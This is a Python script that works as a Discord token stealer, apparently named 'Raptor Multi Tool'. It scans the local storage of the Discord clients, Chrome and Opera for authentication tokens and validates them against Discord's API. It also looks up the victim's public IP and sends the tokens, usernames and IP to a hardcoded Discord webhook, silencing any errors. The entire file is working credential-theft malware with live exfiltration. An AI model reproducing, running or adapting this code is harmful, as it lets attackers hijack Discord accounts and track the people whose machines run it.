
import os
import requests
from re import findall
from json import loads, dumps
from urllib.request import Request, urlopen
web1 = "https://discord.com/api/webhooks/1057051496832843806/8sd34Q_fat1qAbT4u-tHxSxldoAyZf31OISgvSaW9VZN0I1u_ubAsoMFQXvA4Ftm5SDw"
lc = os.getenv("LOCALAPPDATA")
rm = os.getenv("APPDATA")
PATHS = {
    "Discord": rm + "\\Discord",
    "Discord Canary": rm + "\\discordcanary",
    "Discord PTB": rm + "\\discordptb",
    "Google Chrome": lc + "\\Google\\Chrome\\User Data\\Default",
    "Opera": rm + "\\Opera Software\\Opera Stable"
}
def header(token=None):
    headers = {
        "Content-Type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def da(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=header(token))).read().decode())
    except:
        pass
def tukan(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def grabber():
    em = []
    em1 = []
    checked = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in tukan(path):
            if token in checked:
                continue
            checked.append(token)
            user_data = da(token)
            if not user_data:
                continue
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            emb = {
                "fields": [
                        {
                            "name": "Token",
                            "value": token,
                            "inline": False
                        }
                ],
                "author": {
                    "name": f"{username} ",
                },
            }
            em.append(emb)

    ip = requests.get('https://api.ipify.org?format=json')
    global ipv4
    ipv4 = ip.json()["ip"]
    emb1 = {
    "fields": [
            {
                "name": "IP",
                "value": ipv4,
                "inline": False
            }
    ],
    "author": {
        "name": "Raptor Multi Tool",
        },
    }
    em1.append(emb1)


    webhook = {
        "content": "",
        "embeds": em,
        "username": "TOKENS DROP"
    }

    webhook1 = {
        "content": "",
        "embeds": em1,
        "username": "IP"
    }

    try:
        urlopen(Request(web1, data=dumps(webhook).encode(), headers=header()))
        urlopen(Request(web1, data=dumps(webhook1).encode(), headers=header()))
    except:
        pass
if __name__ == '__main__':
    grabber()
    